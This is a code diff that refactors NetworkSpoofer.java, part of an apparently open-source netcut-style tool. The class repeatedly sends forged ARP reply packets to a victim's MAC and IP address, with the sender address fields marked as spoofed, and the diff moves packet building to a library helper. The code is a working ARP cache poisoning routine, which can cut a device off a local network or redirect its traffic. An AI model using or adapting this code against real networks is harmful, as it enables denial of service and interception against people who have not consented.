@@ -17,12 +17,13 @@
 
 package com.ardikars.opennetcut.app;
 
-import com.ardikars.jxnet.Inet4Address;
-import com.ardikars.jxnet.Jxnet;
-import com.ardikars.jxnet.MacAddress;
-import com.ardikars.jxnet.Pcap;
-import com.ardikars.opennetcut.packet.protocol.datalink.Ethernet;
-import com.ardikars.opennetcut.packet.protocol.lan.ARP;
+import com.ardikars.jxnet.*;
+import static com.ardikars.jxnet.Jxnet.PcapSendPacket;
+import com.ardikars.jxnet.util.FormatUtils;
+import com.ardikars.jxnet.packet.protocol.datalink.ethernet.EtherType;
+import com.ardikars.jxnet.packet.protocol.datalink.ethernet.Ethernet;
+import com.ardikars.jxnet.packet.protocol.lan.arp.ARP;
+import com.ardikars.jxnet.packet.protocol.lan.arp.OperationCode;
 import com.ardikars.opennetcut.view.MainWindow;
 import java.nio.ByteBuffer;
 import java.util.logging.Level;
@@ -33,60 +34,52 @@ public class NetworkSpoofer extends Thread {
     
     private volatile boolean stop = false;
     
-    private Pcap pcap;
-    
     private MacAddress spoofedMacAddr;
     private final Inet4Address spoofedIpAddr;
     private final MacAddress victimMacAddr;
     private final Inet4Address victimIpAddr;
     
-    private final MacAddress currentHwAddr;
-    
     private final long to_ms;
-    
-    private LoggerHandler<Integer, String> logHandler;
-    
+
     public NetworkSpoofer(MacAddress victimMacAddr, Inet4Address victimIpAddr,
-            MacAddress spoofedMacAddr, Inet4Address spoofedIpAddr,
-            long to_ms, LoggerHandler logHandler) {
+            MacAddress spoofedMacAddr, Inet4Address spoofedIpAddr, long to_ms) {
         this.spoofedIpAddr = spoofedIpAddr;
         this.spoofedMacAddr = spoofedMacAddr;
         this.victimIpAddr = victimIpAddr;
         this.victimMacAddr = victimMacAddr;
-        this.currentHwAddr = MainWindow.main_windows.getCurrentHwAddr();
         this.to_ms = to_ms;
-        this.logHandler = logHandler;
-        pcap = MainWindow.main_windows.getPcap();
     }
 
     @Override
     public void run() {
-        Ethernet ethernet = new Ethernet()
+        Ethernet ethernet = (Ethernet) PacketBuilder.arpBuilder(victimMacAddr, OperationCode.ARP_REPLY,
+                spoofedMacAddr, spoofedIpAddr, victimMacAddr, victimIpAddr);
+        /*Ethernet ethernet = new Ethernet()
                 .setDestinationMacAddress(victimMacAddr)
-                .setSourceMacAddress(currentHwAddr)
-                .setEtherType(Ethernet.EtherType.ARP)
+                .setSourceMacAddress(StaticField.CURRENT_MAC_ADDRESS)
+                .setEtherType(EtherType.ARP)
                 .setPadding(true);
         ARP arp = new ARP()
-                .setHardwareType(ARP.HW_TYPE_ETHERNET)
-                .setProtocolType(ARP.PROTO_TYPE_IP)
+                .setHardwareType(DatalinkType.EN10MB)
+                .setProtocolType(EtherType.IPV4)
                 .setHardwareAddressLength((byte) 0x06)
                 .setProtocolAddressLength((byte) 0x04)
-                .setOpCode(ARP.OperationCode.REPLY)
+                .setOpCode(OperationCode.ARP_REPLY)
                 .setSenderHardwareAddress(spoofedMacAddr) //spoofed
                 .setSenderProtocolAddress(spoofedIpAddr) //spoofed
                 .setTargetHardwareAddress(victimMacAddr)
                 .setTargetProtocolAddress(victimIpAddr);
-        ethernet.putChild(arp.toBytes());
+        ethernet.setPacket(arp); */
         while (!stop) {
             try {
                 sleep(to_ms);
             } catch (InterruptedException ex) {
                 Logger.getLogger(NetworkSpoofer.class.getName()).log(Level.SEVERE, null, ex);
             }
-            ByteBuffer buffer = ethernet.toBuffer();
-            if (Jxnet.PcapSendPacket(pcap, buffer, buffer.capacity()) != 0) {
-                if (logHandler != null) {
-                    logHandler.log(LoggerStatus.COMMON, "[ WARNING ] :: Failed to send arp packet.");
+            ByteBuffer buffer = FormatUtils.toDirectBuffer(ethernet.getBytes());
+            if (PcapSendPacket(StaticField.PCAP, buffer, buffer.capacity()) != 0) {
+                if (StaticField.LOGGER != null) {
+                    StaticField.LOGGER.log(LoggerStatus.COMMON, "[ WARNING ] :: Failed to send arp packet.");
                 }
                 stop = true;
             }
